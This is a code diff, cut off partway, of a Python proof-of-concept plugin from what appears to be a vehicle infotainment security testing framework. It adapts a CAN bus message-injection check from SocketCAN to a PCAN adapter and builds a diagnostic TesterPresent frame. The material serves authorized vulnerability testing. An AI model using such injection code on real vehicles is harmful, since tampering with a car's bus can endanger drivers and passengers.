@@ -1,27 +1,32 @@
 """
 PoC Name: CAN Message Injection
 CVE: N/A
-Component: Canbus Stack
-Category: Canbus
+Component: CAN Bus (PCAN)
+Category: Protocol
 Severity: Critical
 CVSS: 9.0
-Description: 注入UDS TesterPresent帧,验证CAN总线认证机制
-Prerequisites: SocketCAN接口, python-can库, 授权测试环境。
-Usage: python3 23_CAN_Message_Injection.py <can_interface>
+Description: 向CAN总线注入任意帧,验证是否缺少认证和过滤机制。
+Prerequisites: PCAN接口, python-can库, PCAN驱动, 授权测试环境。
+Usage: python3 23_CAN_Message_Injection.py PCAN_USBBUS1
 """
 import sys
 from iv_plugin_base import IVIVulnerabilityPlugin
 
 class CANInjectionPlugin(IVIVulnerabilityPlugin):
     def check_prerequisites(self):
+        iface = self.params.get("can_interface", "PCAN_USBBUS1")
+        self.logger.info(f"检查CAN接口: {iface}")
         return True
 
     def exploit(self):
-        iface = self.params.get("can_interface", "can0")
+        iface = self.params.get("can_interface", "PCAN_USBBUS1")
         self.logger.info(f"CAN帧注入测试 ({iface})...")
         try:
             import can
-            bus = can.interface.Bus(channel=iface, bustype="socketcan")
+            if "PCAN" in iface:
+                bus = can.interface.Bus(channel=iface, interface="pcan", bitrate=500000)
+            else:
+                bus = can.interface.Bus(channel=iface, bustype="socketcan")
             # Inject a diagnostic request (UDS TesterPresent)
             test_msg = can.Message(
                 arbitration_id=0x7DF,
